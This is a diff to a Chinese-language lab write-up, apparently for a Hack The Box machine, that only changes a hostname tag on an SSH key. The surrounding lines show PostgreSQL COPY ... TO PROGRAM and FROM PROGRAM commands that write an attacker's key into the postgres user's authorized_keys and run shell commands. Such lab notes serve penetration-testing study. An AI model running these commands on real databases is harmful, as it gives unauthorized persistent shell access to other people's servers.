@@ -90,11 +90,11 @@ COPY 0
 [~][★]$ ssh-keygen -t ed25519 //本地生成公钥
 [~][★]$ cat /home/syareya55/.ssh/id_ed25519.pub
 
-service=# COPY (SELECT 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINa0DZUSKxs90lXaBgsMKCoypLsO7RvwVUDFk67R77f3 syareya55@htb-y688w65shk') TO PROGRAM 'tee /var/lib/postgresql/.ssh/authorized_keys';
+service=# COPY (SELECT 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINa0DZUSKxs90lXaBgsMKCoypLsO7RvwVUDFk67R77f3 syareya55@nothing') TO PROGRAM 'tee /var/lib/postgresql/.ssh/authorized_keys';
 COPY 1
 service=# COPY cmd FROM PROGRAM 'cat /var/lib/postgresql/.ssh/authorized_keys';
 COPY 1
-service=# COPY (SELECT 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINa0DZUSKxs90lXaBgsMKCoypLsO7RvwVUDFk67R77f3 syareya55@htb-y688w65shk') TO PROGRAM 'tee /var/lib/postgresql/.ssh/authorized_keys';
+service=# COPY (SELECT 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINa0DZUSKxs90lXaBgsMKCoypLsO7RvwVUDFk67R77f3 syareya55@nothing') TO PROGRAM 'tee /var/lib/postgresql/.ssh/authorized_keys';
 COPY 1
 service=# COPY cmd FROM PROGRAM 'cat /var/lib/postgresql/.ssh/authorized_keys';
 COPY 1
@@ -451,7 +451,7 @@ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINa0DZUSKxs90lXaBgsMKCoypLsO7RvwVUDFk67R77f3
 ```
 #### 我还可以将输入信息传递给一个命令，从而实现诸如创建文件之类的操作：
 ```
-service=# COPY (SELECT 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINa0DZUSKxs90lXaBgsMKCoypLsO7RvwVUDFk67R77f3 syareya55@htb-y688w65shk') TO PROGRAM 'tee /var/lib/postgresql/.ssh/authorized_keys';
+service=# COPY (SELECT 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINa0DZUSKxs90lXaBgsMKCoypLsO7RvwVUDFk67R77f3 syareya55@nothing') TO PROGRAM 'tee /var/lib/postgresql/.ssh/authorized_keys';
 COPY 1
 service=# COPY cmd FROM PROGRAM 'cat /var/lib/postgresql/.ssh/authorized_keys';
 COPY 1
